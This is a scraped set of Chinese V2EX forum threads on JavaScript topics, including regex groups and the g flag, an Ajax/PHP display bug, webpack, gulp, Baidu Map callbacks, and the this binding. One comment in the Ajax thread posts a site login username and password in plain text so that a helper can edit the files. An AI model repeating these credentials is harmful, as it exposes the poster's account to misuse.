"推荐一本书《精通正则表达式》", "#1.\"abcd\".match(/ab|cd/) \r", "无需解释\r", "#2.\"abcd\".match(/(ab|cd)/) \r", "事实上这是分组函数，返回的数组：第一个是字符串本身，第二个往后是匹配到的分组\r", "#3.\"abcd\".match(/(ab|cd)+/)\r", "\r", "#4.\"abcd\".match(/ab|(cd+)/)\r", "依旧分组，其实能匹配到ab，然而括号决定了你需要的是cd+，字符串里并没有cd+，返回undefined\r", "\r", "#5.\"abcd\".match(/ab+|cd+/)\r", "无需解释\r", "#6.\"abcd\".match(/(ab)+|cd+/)\r", "同分组\r", "#7.\"abcd\".match(/ab|(cd)+/)\r", "分组\r", "\r", "事实上如果没有需要从字符串中取出数据的需求，仅仅是验证的话，可以使用test函数。", "错了 没睡醒 当没看到吧", "```javascript\r", "\"zzabcd\".match(/zz(ab|cd)/)\r", ">= [\"zzab\", \"ab\"]\r", "```\r", "\r", "圆括号中的是被称为小正则，上面的匹配结果中，会返回2个值，第一个值是匹配的完整值，第二个值则是匹配小正则（圆括号）中的值。故为什么JS中 `\"abcd\".match(/(ab|cd)/) `  返回了2个ab，因为第一个值代表完整匹配的值，而第二个值代表小正则中的值。\r", "\r", "```javascript\r", "\"zzab\".match(/(zz(ab|cd))/)\r", ">= [\"zzab\", \"zzab\", \"ab\"]\r", "```\r", "这里最外围又加了一个括号，原理是一样的，返回的值按完整值，小正则，小小正则，依次排列。", "本来觉得自己挺清楚的。。。看完糊涂了。。。\r", "\"abcd\".match(/(ab|cd)+/) \r", "这个正则不是应该返回\r", "[\"abcd\",\"ab\",\"cd\"]么", "感觉被你搞复杂了", " 这个例子其实挺好的。以前从来没想过这个问题倒是。\r", "首先这里只有一个括号，所以捕捉出来的只会有一个结果。\r", "那么至于这里，为什么会出现cd而不会出现ab呢？\r", "说实话我也没找到依据。只觉得这东西应该和贪婪性有关。\r", "/(ab|cd)+?/就会匹配第一个找到的，而贪婪匹配就会一路测试到最后一个。", " 然而我要是加上 g 的话就只剩一个结果了是为什么。。。", " \r", " \r", "capture只capture最后一个，或者说会被覆盖"]},
{"content": ["<div class=\"topic_content\">我要实现的功能是:  按下按钮后触发 JavaScript  执行Ajax  向PHP后台查询数据  然后返回给JavaScript进行 一条一条的显示出来，  今天想了一天  蛮子都要炸了，完全不懂JavaScript  都是现学现用，JS帮我看看吧。\r<br>\r<br>\r<br>带上飞机： <a target=\"_blank\" href=\"http://v.milog.cn/ajax/\" rel=\"nofollow\">http://v.milog.cn/ajax/</a>\r<br>代码如下：\r<br>\r<br>&lt;!DOCTYPE html&gt;\r<br>&lt;html&gt;\r<br>&lt;head&gt;\r<br>&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\r<br>&lt;meta name=\"viewport\" content=\"width=device-width,\r<br>initial-scale=1.0,\r<br>maximum-scale=1.0,\r<br>user-scalable=0\" /&gt;\r<br>&lt;meta http-equiv=Cache-Control content=no-cache /&gt;\r<br>&lt;title&gt;测试&lt;/title&gt;\r<br>&lt;!--JavaScript代码--&gt;\r<br>&lt;script type=\"text/javascript\"&gt;\r<br>i=0;\r<br>\r<br>function go(){\r<br>//document.getElementById(\"txt\").innerHTML=\"&lt;div style='margin:50% auto;text-align:center'&gt;努力加载中...&lt;/div&gt;\";\r<br>\r<br>if (window.XMLHttpRequest){\r<br>  xmlhttp=new XMLHttpRequest();\r<br>}else {\r<br>  xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\r<br>}\r<br>\r<br>\r<br>&lt;!-- Ajax POST请求--&gt;\r<br>var url=document.getElementById(\"url\").value;\r<br>var go_url = \"mysqli.php\";\r<br>xmlhttp.open(\"POST\",go_url,true);\r<br>xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\r<br>xmlhttp.send(\"url=\"+url);\r<br>\r<br>\r<br>xmlhttp.onreadystatechange = function(){\r<br>if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200) {\r<br>\r<br>\r<br>\r<br>var eoo =xmlhttp.responseText;\r<br>\r<br>\r<br>type(eoo);\r<br>\r<br>\r<br>\r<br>    }\r<br>  }\r<br>}\r<br>\r<br>\r<br>function type(eoo){\r<br>\r<br>var str  = eoo.split('&lt;&gt;');\r<br>\r<br>//document.getElementById(\"str\").innerHTML += '&lt;div&gt;'+str[i];\r<br>\r<br>txt.innerHTML += '&lt;div&gt;' + str[i] + '&lt;/div&gt;';\r<br>\r<br>i++;\r<br>\r<br>if(i&gt;=str.length) return;\r<br>\r<br>setTimeout(\"type(str)\",100);\r<br>  \r<br>}\r<br>\r<br>\r<br>&lt;/script&gt;\r<br>\r<br>&lt;!--CSS代码--&gt;\r<br>&lt;style type=\"text/css\"&gt;\r<br>pre{\r<br>    white-space: pre;           /* CSS 2.0 */\r<br>    white-space: pre-wrap;      /* CSS 2.1 */\r<br>    white-space: pre-line;      /* CSS 3.0 */\r<br>    white-space: -pre-wrap;     /* Opera 4-6 */\r<br>    white-space: -o-pre-wrap;   /* Opera 7 */\r<br>    white-space: -moz-pre-wrap !important; /* Mozilla */\r<br>    white-space: -hp-pre-wrap;  /* HP Printers */\r<br>    word-wrap: break-word;\r<br>}\r<br>\r<br>.header {\r<br>text-align:center;\r<br>//width:100%;\r<br>background-color:#FAEBD7;\r<br>padding:10px 20px;\r<br>margin:auto;\r<br>}\r<br>\r<br>input {\r<br>border: 1px dashed #666;\r<br>}\r<br>\r<br>&lt;/style&gt;\r<br>&lt;/head&gt;\r<br>&lt;body&gt;\r<br>&lt;div class=\"header\"&gt;\r<br>&lt;input type=\"text\" id=\"url\" value=\"\" / &gt;\r<br>&lt;button type=\"button\"  onclick=\"ql()\"&gt;清除&lt;/button&gt;\r<br>&lt;button type=\"button\"  onclick=\"go()\"&gt;抓取&lt;/button&gt;&lt;/div&gt;\r<br>&lt;div id=\"txt\"&gt;&lt;/div&gt;\r<br>&lt;/body&gt;\r<br>&lt;/html&gt;</div>"], "reply": "30", "tittle": "JavaScript Ajax PHP 做异步显示问题", "comment": ["关键字: setTimeout 作用域", "不管怎么样用原生Ajax值得表扬。", "稍微改了一下，你看看能用不\r", "不用jQuey 也是彪悍", "jquery 几行代码就可以搞定，为啥要写原生的代码", "  可以是可以  但有一些不明白。", "  我不是靠代码吃饭，所以我还要最求效率，所以比较喜欢原生。", " setTimeout(\"type(str)\",100);换成setTimeout(function(){type(str)},100);即可，见#1 关键字\r", "变量名叫eoo吐槽无力……", "  不行哦，不过还是谢谢。由于是手机码代码，为了节省时间，就随便写了。", " 刚刚看错了……以为函数直接传的str……\r", "function type(eoo) {\r", "\ttypeStr(eoo.split('<>'));\r", "}\r", "function typeStr(str) {\r", "\t//document.getElementById(\"str\").innerHTML += '<div>'+str[i]; \r", "\ttxt.innerHTML += '<div>' + str[i] + '</div>';\r", "\ti++;\r", "\tif (i >= str.length) return;\r", "\tsetTimeout(function(){type(str)}, 100);\r", "}", " 好吧我手残……\r", "function type(eoo) { \r", "typeStr(eoo.split('<>')); \r", "} \r", "function typeStr(str) { \r", "//document.getElementById(\"str\").innerHTML += '<div>'+str[i]; \r", "txt.innerHTML += '<div>' + str[i] + '</div>'; \r", "i++; \r", "if (i >= str.length) return; \r", "setTimeout(function(){typeStr(str)}, 100); \r", "}", "  还是不能连续输出，点测试 只能取一天数据。。。。。    感情JavaScript水好深，真是吓屎宝宝我了，学点基础果断回到原生PHP的怀抱中～～～", " 听不懂\"只能取一天数据\"什么意思……是指不能点第二次测试吗……那是因为你的i是全局变量，点了一次之后i已经到7了", "  打错字了，是一条，  其实我想要的效果就是这样的http://e.milog.cn/  但是我又不会怎么监控echo的的状态，  所以只能把responseText返回的数据再进行二次加工。  无奈 不会JavaScript 现学现写 就是不知道哪里出了问题。", "  可以点，就是本来应该点一次就连续输出5条记录，现在问题是点一次出一天。", " 你确定用的是#11的代码吗……还有测试页面第43行比这边主题的代码多了个setTimeout(\"type(eoo)\",100);删掉", " 么么哒", "用jquery多省事", "  要不你直接帮我改吧 顺便测试  ", "     用户名 eoo 密码 xuchangyu   文件在ajax文件夹里面。", "  jquery已经阻碍了人类脑细胞的发现，哈哈。", " 起晚了……已改，个人意见如果兼容古老ie的话jq还是挺有用的，可以省掉写ie兼容的时间……", " 不过我是本着尽量少改代码的原则的，要我重写的话估计会变成\r", "这样吧……\r", "\r", "不过这个说到底还是等数据全部加载完毕之后再延时一条一条显示，如果需要服务端echo一次输出一次的话参考https://web-tinker.com/article/20047.html", "  你真厉害，我的偶像啊，  你扣扣多少  能加一下吗？", " 并不厉害_(:з」∠)_而且我那张图真要用的话估计polyfill得比业务代码多不知多少倍……", " 不过还有个小问题，就是在输出完后  再点  就会再输出 一个undefined  这个如何解决？\r", "\r", "\r", "你给我推荐的那篇文章就是传说中的 反Ajax吧？  这个需要在服务端做死循环  感觉普通的虚拟主机会受不鸟。", " 所以我问过你需不需要点第二次……已改\r", "\r", "那个死循环只是为了演示，正确用法是echo 耗时操作 echo这样，是为了边加载边显示，不耗时就没多大意义了……\r", "\r", "好吧我可能是搞错了你的想法，估计你只是想做个逐行显示的效果愉♂悦一下用户:joy:\r", "\r", "题外话 comet和websocket乖乖交给node.js，php写=作死", "  谢谢你的耐心解答，灰常感谢。", "这年头没人会写野生JavaScript了吗", "  我写的不就是了吗？", "打酱油"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>&lt;input type=\"text\" id=\"txt\"&gt;<br>\n    &lt;script type=\"text/javascript\"&gt;<br>\n        window.onload = function() {<br>\n            var reg = /^[\\u4e00-\\u9fa5\\u22c5\\u2022\\u00b7]+$/gi,<br>\n                txt = document.getElementById(\"txt\");<br>\n            txt.onblur = function() {<br>\n                console.log(txt.value);<br>\n                console.log(reg.test(txt.value)); //false<br>\n            }<br>\n        }<br>\n    &lt;/script&gt;<br>\n验证中文、圆点字符，为毛输入框的文本值没变化的情况下：第一次触发验证是true，第二次是false？</p>\n</div></div>", "<div class=\"topic_content\">感觉1楼2楼的解答，E文有点渣，有点吃力，看的还不是太明白。javascript正则的g/m/i。只有i是最好理解的。再找找资料，看看g/m。</div>"], "reply": "11", "tittle": "javascript 失焦事件，正则验证什么鬼?", "comment": ["/^[\\u4e00-\\u9fa5\\u22c5\\u2022\\u00b7]+$/ 就好了,没有必要加gi", "很奇怪你为什么验证中文字符还要加上 不区分大小写 。。。。", " 这个真是习惯加上的，真心不太理解global", " \r", "i才是不区分大小写。。\r", "g是匹配所有\r", "如2楼所说，如果你只是检测这个里面存不存在的话的确没必要加上g\r", "比如 \r", "\"1111\".match(/1/)\r", "和\r", "\"1111\".match(/1/g)\r", "\r", "出来的结果分别是\r", "['1']\r", "和\r", "['1','1','1','1']\r", "不加g就是一旦匹配到第一个就停止。。\r", "加了g就是一直查找直到所有的全部匹配到", "刚刚google了一下。。。。m的意思大概就是换行符能被  .  匹配吧。。", "点进连接看了一下。。。\r", "大意是这么回事\r", "由于 g 是要求查找所有匹配\r", "所以每次调用并不是每次都取第一个匹配值。。\r", "而是依次取第一个，第二个，第三个。。知道空。。\r", "按照你的写法，貌似只能匹配到一个值，\r", "所以返回的值大概是这样\r", "返回取到的第一个值     true\r", "后面没有了，返回空     false\r", "上一次返回了空，返回取到的第一个值     true\r", "后面没有了，返回空    false", " 7楼正解，如果加g就是一次匹配尾部所有符合内容直到匹配到空然后进行下一次从头匹配", "经典问题啊，用正则的 test() 测试的时候千万要小心，特别是加上 global 标识符之后，正则对象会记忆上一次的匹配位置，接下来的 test 都是接着上一次成功的位置开始匹配的，你每次执行 test 完之后可以打印 reg.lastIndex 看一下", " 我去，还有这种问题呀。受教了", " 恩 这是个坑"]},
{"content": ["<div class=\"topic_content\">如题。 tks</div>"], "reply": "7", "tittle": "webpack-dev-server 怎么监听 html 改变后 livereload？", "comment": [" 这是ruby的吧", "\r", "\r", "webpack can't recognize html changes, so you will still need livereload.\r", "\r", "PS, webpack dev server's documents is very error-prone.", " tk you!  已经用livereload了", "我用的是 gulp 的 watch ，看我的代码："]},
{"content": ["<div class=\"topic_content\">目前公司的项目在 jenkins 自动部署的时候会自动去调用 gulp 压缩处理等:\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/sqzr/f68579d53c7431ef4982\">https://gist.github.com/sqzr/f68579d53c7431ef4982</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>js 文件非常多吧,大概有一两百个,每次运行的时候:\r<br><img src=\"http://ww2.sinaimg.cn/large/e83497fcgw1ev5ik75hcqj20gd0ca77k.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"> \r<br>都要花两三分钟,服务器的配置非常高,32 核:\r<br><img src=\"http://ww2.sinaimg.cn/large/e83497fcgw1ev5il7yu4tj20gt05f75p.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"> \r<br>\r<br>是 gulp.js 不支持多核？还是哪里没配置好</div>"], "reply": "10", "tittle": "gulp.js(Node.js) 没办法利用多核?", "comment": ["Node.js 的缺点之一就是不能充分利用多核啊", " 好吧...没接触过这东西..原来这样", "我这边的做法是新开一个 concurrent task ，用 exec 调用 gulp task 来使用多核心。 gulp 类似插件我过，貌似没有，可能是太简单了，别人不屑做？", "多久之前的事情了，现在早可以用多核了\r", "利用多核请借助 child_process 、 cluster 模块", "一个核心运行一个线程", "可以的，开 worker ，简单的方法是把 task 分成多个子任务，在不同的 cluster 中跑", "NodeJS 是单线程的 没办法\r", "只能通过调用多进程来解决", " 4L 把我想说的都说了", "加 cache"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>JS 新手一名。<br>\n想查询江苏省下所有的耐克店的信息。<br>\n思路是先取到有耐克店的城市然后再通过城市名查询到信息都 push 到 results 数组里。<br>\n可是问题是 results 数组里面的值并没有完全存储进去。<br>\n求来解答。<br>\n代码如下<br>\n&lt;script type=\"text/javascript\"&gt;<br>\n    var map = new BMap.Map (\"allmap\");<br>\n    var lng;<br>\n    var lat;<br>\n    var searchInfoWindow = null;<br>\n    var br=new Array ();<br>\n    map.centerAndZoom (new BMap.Point (116.404, 39.915 ), 11 );<br>\n    var local = new BMap.LocalSearch (\"江苏省\", {<br>\n        renderOptions: {map: map, panel: \"r-result\"}<br>\n    });<br>\n    local.search (\"nike\");<br>\n    local.setSearchCompleteCallback (function (rs ) {<br>\n        var count=rs.getCityList ().length;<br>\n        var city=rs.getCityList ()<br>\n        for (var x=0 ;x&lt;count;x++){<br>\n            var local = new BMap.LocalSearch (city[x].city, {<br>\n                renderOptions: {map: map, panel: \"r-result\"}<br>\n            });<br>\n            local.search (\"nike\");<br>\n            var results = new Array ();<br>\n            var i=0;<br>\n            local.setSearchCompleteCallback (function (rs ) {<br>\n                if (local.getStatus () == BMAP_STATUS_SUCCESS ) {<br>\n                    for (j = 0; j &lt; rs.getCurrentNumPois (); j++) {<br>\n                        var poi = rs.getPoi (j );<br>\n                        var title= poi.title;<br>\n                        var lng = poi.point.lng;<br>\n                        var lat = poi.point.lat;<br>\n                        var addr = poi.address;<br>\n                        var result = {<br>\n                            addr: addr,<br>\n                            lng: lng,<br>\n                            lat: lat,<br>\n                            title: title<br>\n                        };<br>\n                        results.push (result );<br>\n                    }<br>\n                    if (rs.getPageIndex () != (rs.getNumPages ()+1 )) {<br>\n                        i = i + 1;<br>\n                        local.gotoPage (i );<br>\n                    }<br>\n                    console.log (results );<br>\n                }</p>\n<div class=\"highlight\"><pre>});\n    }\n\n});\n</pre></div>\n\n<p>&lt;/script&gt;</p>\n</div></div>"], "reply": "1", "tittle": "百度地图 api 检索问题", "comment": ["感觉是 setSearchCompleteCallback 没有在 for 循环中执行"]},
{"content": ["<div class=\"topic_content\">比如句号输入进去都变成点了。Windows是OK的，这个是在哪里有设置的吗？\r<br>谢谢！</div>"], "reply": "12", "tittle": "问下哈， WebStorm for Mac 怎么不能直接输入中文标点？", "comment": ["字体", " 跟Win下一样，都是用的Source Code Pro啊", "  \r", "我这里可以。 楼主用的什么输入法？", " 我试了百度和搜狗，都不行。输入进去的都变成英文的标点符号了。但貌似书名号不会《》", "复制粘贴行不行？", " 复制粘贴是OK的。", "输入法自动在英文后面用英文标点之类的？", "貌似是 JDK 的原因？用 JDK 1.6 的时候能输入，换成 1.8 以后就不行了。", "解决方法：\r", "\r", "- 移除 /Applications/WebStorm.app/Contents/ 里面的 `jre` 文件夹；\r", "- 安装 JDK  8u45（最新版 8u51 同样有问题）http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html#jdk-8u45-oth-JPR", "用phpstorm", " 哦，前端不知道了", "额 ，终于找到原因了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>介绍一种使用 gulp-webpack 来做即时 webpack 构建的方法.相比 webpack –watch 这种方法的好处是使用更少的内存.</p>\n\n<p>链接: <a target=\"_blank\" rel=\"nofollow\" href=\"http://kidliaa.tumblr.com/post/126167558390/%E8%A7%A3%E5%86%B3-webpack-watch-%E5%AF%BC%E8%87%B4%E7%94%B5%E8%84%91%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E9%97%AE%E9%A2%98\">http://kidliaa.tumblr.com/post/126167558390/%E8%A7%A3%E5%86%B3-webpack-watch-%E5%AF%BC%E8%87%B4%E7%94%B5%E8%84%91%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E9%97%AE%E9%A2%98</a></p>\n</div></div>"], "reply": "6", "tittle": "解决 Webpack —watch 导致电脑内存占用过高的问题", "comment": ["我是来看LZ头像的。", "我是来看LZ头像的。", "LZ 有遇到过 webpack 一直启动不了的情况吗？有时候我必须注释掉一些 require，webpack 才能启动……", " 还没遇到过。有什么报错信息么。", " 找到原因了，其实是 sass-loader 的一个 bug，在 2.0.0 已经修复了。\r", "详见： ", " 换掉咯"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近手头有个东西要实现类似一个场馆的平面图，点击相应的位置能看到那个位置对应的信息的功能。想求助下各位Ｖ友有没有好的推荐？</p>\n</div></div>"], "reply": "4", "tittle": "求推荐一个做室内（场馆）平面图交互的 library", "comment": ["svgmap 之类的？不大可能找的到完全伸手的", "早些年也到处找这个，一直没找到合适的，自己折腾了一个，效果很普通。\r", "现在项目上在用商用版本的 JS 库， HT 啥的。", "用 D3.js", "之前用的是 amcharts"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近用业余时间写了个手机端的 <code>fullpage</code> 框架。<br>\n今天下午下班后用公司的电脑调试的时候，打了俩个断点，调了一半就走了。<br>\n然后回到家后，打开 chrome 开发工具继续调试，然后点了一下页面，直接跳到我在公司打的那个断点上了。我想说，这也太强了,这是怎么做到的啊?<br>\n震惊之余，我赶紧上来发个帖，赞叹一下这可怕的 chrome 。</p>\n\n<p>顺便贴一下项目地址：<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/kisnows/fullpage.js\">https://github.com/kisnows/fullpage.js</a><br>\n以及半成品的预览地址：<a target=\"_blank\" rel=\"nofollow\" href=\"http://kisnows.com/fullpage.js/src/\">http://kisnows.com/fullpage.js/src/</a><br>\n欢迎大家提 issue ，如果有 pr 那就更好了。</p>\n</div></div>", "<div class=\"topic_content\">是两台不同的电脑</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>昨晚在家打了五个断点，刚才测试了一下，发现没能同步过来……<br>\n难道是我昨天在家和公司打了一样的断点?</p>\n</div></div>"], "reply": "39", "tittle": "Chrome 太牛了，竟然连这个都能同步", "comment": ["应该不会的吧，我在一个项目打个断点，换个 tab 打开都没有了的，换个电脑更应该没有了吧。", "  可是我刚才就碰到这个问题了", "换国内就是：卧槽真个都能记录到,真是 xxxxxx", " 刚测试了下，关掉浏览器再打开断点也还在", " 而且我这是用两台不同的电脑。", "666666666666", "也是屌。。", "国产软件太牛了。银行卡密码都能同步。", "未经授权就能同步吗？！\r", "还是广告帖？", " 都是我自己的 google 帐号，所以不存在授权的问题。", "我上次也碰到一稀奇的事，手机 iPhone ， windows 装 chrome ，开启了 icloud 书签同步。电脑访问一个从来没去过的网站，手机也是，网址例如 xxx.xx ，没添加书签。但是当我打开手机 Safari 的时候地址栏输入 x 居然能识别出 xxx.xx ，而且还有我电脑上的历史纪录。我不知道怎么搞出来的。。反正后来再也没成功过。", "chrome 能正常同步的时候会同步一大堆东西（比如历史，插件设置）。然而 chrome 经常不能正常同步的情况下就然并卵了", " 同步历史插件设置这些我都知道，但是连断点都能同步，这就有点不可思议了。至于经常不能同步的情况，就得自备梯子了。", "领导，您在自己家的电脑上 Ctrl+c ，在单位电脑 Ctrl+V 是复制不了的。\r", "啊！不不不，多贵的电脑都复制不了。", "关注", "我去测试下，家里 3 台电脑", "测试是不行，兄弟什么环境版本？开启什么选项么？", " 事实是可以", "断点都能同步。。。。。醉了，然而我并没有两台电脑", "简直不可思议。你明天看看还能重现吗？\r", "如果能的话，那这就屌炸天了！\r", "如果不能的话，那可能的解释是：有些稀奇的事情其实是因为自己忽略了某个细节，这种事情往往很难重现。", " 我打算今晚打上五个断点，看看明天换电脑后能不能同步。", " 没有开启什么特定的选项，版本是 44.0.2403.125 m 。", " 自动联想功能，刚开始我也惊讶", "我想说的是： fullpage 原本好像就有兼容手机端的吧？", " 远程桌面就可以，我经常在实验室远程桌面，用 Ctrl + C 复制宿舍电脑的文件。", "iPhone6+上有问题", " 哈哈，有道理。", " 嗯，这个我也发现了，正在找问题出在哪。", "有版本的要求么？", " \r", "  这只是一个段子。(ಥ_ಥ)", "CHROME （ google ）服务都享受不了，何谈同步，擦", " 已经解决了", " ＋ 1", "奇怪，我知道这个功能…\r", "但我既不是做前端的，又不用 chrome …\r", "那如果这是第一次有人在 V2EX 上发，我是怎么知道这个功能的呢…？", " 不用 chrome 怎么能知道，-_-", "话说 jQ 早就有了 fullpage.js 的插件了，你还叫同样的名字啊", " 这个我知道，但是没有别的合适名字叫。而且我 fullpage 这个并不依赖任何库，是原生 js 写的,对移动友好。我就是因为公司之前接到类似的项目，才打算写这个的。", "终于可以在公司电脑复制，回家粘贴了", " 我这个跟你说的那个 fullpage 不一样，你说的那个是基于 jquery 开发的插件。我这个不依赖其它库，而且文件压缩后很小。\r", " 没能重现，可能是我之前在家打了同样的断点……\r", " 不能重现，应该说我误以为可以同步断点了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nt\">&lt;p&gt;</span>The \n    <span class=\"nt\">&lt;abbr</span> <span class=\"na\">title=</span><span class=\"s\">\"World Wide Web Consortium\"</span><span class=\"nt\">&gt;&lt;em&gt;</span>W3C<span class=\"nt\">&lt;/em&gt;&lt;/abbr&gt;</span> \n    defines the\n    <span class=\"nt\">&lt;abbr</span> <span class=\"na\">title=</span><span class=\"s\">\"Document Object Model\"</span><span class=\"nt\">&gt;</span>DOM<span class=\"nt\">&lt;/abbr&gt;</span> \n    and \n    <span class=\"nt\">&lt;abbr</span> <span class=\"na\">title=</span><span class=\"s\">\"Application Programming Interface\"</span><span class=\"nt\">&gt;</span>API<span class=\"nt\">&lt;/abbr&gt;</span>\n<span class=\"nt\">&lt;/p&gt;</span>\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://ww1.sinaimg.cn/bmiddle/6a9502c9gw1ev8uzk2edyj20gq07btai.jpg\">http://ww1.sinaimg.cn/bmiddle/6a9502c9gw1ev8uzk2edyj20gq07btai.jpg</a></p>\n\n<p><code>document.getElementsByTagName (\"abbr\")[0].lastChild</code><br>\n获取的是 em 元素节点啊，元素节点哪来的 nodeValue 属性<br>\n<code>document.getElementsByTagName (\"abbr\")[0].lastChild.firstNode.nodeValue</code> 才能拿到值</p>\n</div></div>"], "reply": "5", "tittle": "《DOM 编程艺术》这段内容是我理解错了吗？", "comment": ["document.getElementsByTagName (\"abbr\")[0].lastChild.firstChild.nodeValue\r", "\r", "查了下，好像没有 firstNode", " 写错了是 firstChild", "楼主漏掉一个节点 TextNode ，\r", "文字也是节点", "document.getElementsByTagName (\"abbr\")[0] 获取的是第一个 abbr 节点", "就是楼上所说的，文字也是一个节点\r", "低级 IE 浏览器没遵循这个标准"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我把一些 DOM 方法赋给变量，以供方便使用，但是遇到了错误。 </p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">gTag</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementsByTagName</span><span class=\"p\">;</span>\n<span class=\"c1\">// undefined</span>\n\n<span class=\"nx\">gTag</span>\n<span class=\"c1\">// getElementsByTagName ()</span>\n\n<span class=\"nx\">gTag</span> <span class=\"p\">(</span><span class=\"s2\">\"p\"</span><span class=\"p\">)</span>\n<span class=\"c1\">// TypeError: 'getElementsByTagName' called on an object that does not implement interface Document.</span>\n</pre></div>\n\n<p>刚接触 JS 没多久，非常不理解，为什么把这个方法赋给变量，不用括号输入变量名就是直接调用了。<br>\n然后我了解了下 call 和 apply 方法，原来 JS 下有这种好用的机制，一个新对象未定义一个方法，可直接调用旧对象的方法，只需要把新对象作为 this 传给旧对象的方法。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">Old</span> <span class=\"p\">(){}</span>\n\n<span class=\"nx\">Old</span><span class=\"p\">.</span><span class=\"nx\">prototype</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"s2\">\"old name\"</span><span class=\"p\">,</span>\n    <span class=\"nx\">run</span><span class=\"o\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(){</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span> <span class=\"p\">(</span><span class=\"s2\">\"Name is: \"</span> <span class=\"o\">+</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">o</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Old</span><span class=\"p\">;</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">New</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"s2\">\"new name\"</span>\n<span class=\"p\">};</span>\n\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">run</span> <span class=\"p\">(</span><span class=\"nx\">New</span> <span class=\"p\">);</span> <span class=\"c1\">// Name is new name</span>\n\n\n<span class=\"kd\">var</span> <span class=\"nx\">run</span> <span class=\"o\">=</span> <span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">;</span>\n<span class=\"nx\">run</span><span class=\"p\">.</span><span class=\"nx\">call</span> <span class=\"p\">(</span><span class=\"nx\">o</span> <span class=\"p\">);</span>  <span class=\"c1\">// name is old name</span>\n</pre></div>\n\n<p>但是我非常不理解为什么把实例的方法赋值给一个变量后会丢失 this 指针。</p>\n\n<p>这里无意挑起语言的纷争！！</p>\n\n<p>然后我想起了 Python 的类：  </p>\n<div class=\"highlight\"><pre><span class=\"k\">class</span> <span class=\"nc\">A</span><span class=\"p\">:</span>\n    <span class=\"k\">def</span> <span class=\"nf\">run</span> <span class=\"p\">(</span><span class=\"bp\">self</span> <span class=\"p\">):</span>\n        <span class=\"k\">return</span> <span class=\"s\">\"running\"</span>\n\n<span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">A</span> <span class=\"p\">()</span>\n<span class=\"n\">run</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"n\">run</span>  \n<span class=\"n\">run</span> <span class=\"p\">()</span>\n\n<span class=\"n\">A</span><span class=\"o\">.</span><span class=\"n\">run</span> <span class=\"p\">()</span>\n<span class=\"sd\">\"\"\"Traceback (most recent call last ):</span>\n<span class=\"sd\">File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;</span>\n<span class=\"sd\">TypeError: unbound method run () must be called with A instance as first argument (got nothing instead )\"\"\"</span>\n\n<span class=\"n\">A</span><span class=\"o\">.</span><span class=\"n\">run</span> <span class=\"p\">(</span><span class=\"n\">a</span> <span class=\"p\">)</span>\n</pre></div>\n\n<p>好像明白了些什么，但是又好像模糊！</p>\n\n<p>JS 里面把实例方法赋值给变量，以变量再调用，但是 this 会丢失。就好像如 Python 中的 A.run<br>\n未实例化直接使用，也会报错。 JS 在 nodejs 环境下虽然未报错，但是输出的是 Name is undefined 也就是说找不到 this.name ，当成一个普通函数运行了。</p>\n\n<p>我的理解是否有误？</p>\n\n<p>现在还是不太明白为什么对实例方法赋值操作 <code>var a = object.method</code> 会丢失 this 。</p>\n</div></div>"], "reply": "16", "tittle": "关于 JS 的面向对象，好像有点明白了，又好像模糊。", "comment": ["被你说晕了。真心被你说晕了。我先回答你最后一个问题", "找不到对象", "var a = object.method 会丢失 this 。\r", "\r", "不是会丢失 this 。是这样的你看这个\r", "\r", "var object = {\r", "    name: 'username',\r", "    method: function () {\r", "        console.log (this.name );\r", "    }\r", "};\r", "\r", "我如果执行 object.method (); 这样的话 他就会输出 username\r", "如果我先赋值给 a;\r", "\r", "var a = object.method\r", "\r", "那么，其实等于\r", "\r", "var a = function () {\r", "    this.name;\r", "}\r", "\r", "当前的 this 指向的是 window ，也就是 window.name", "o.run (New ); // Name is new name\r", "这里搞错了\r", "\r", "o.run.call (New ); // Name is new name", " 原来如此", "看在用 Java 的角度理解 JavaScript 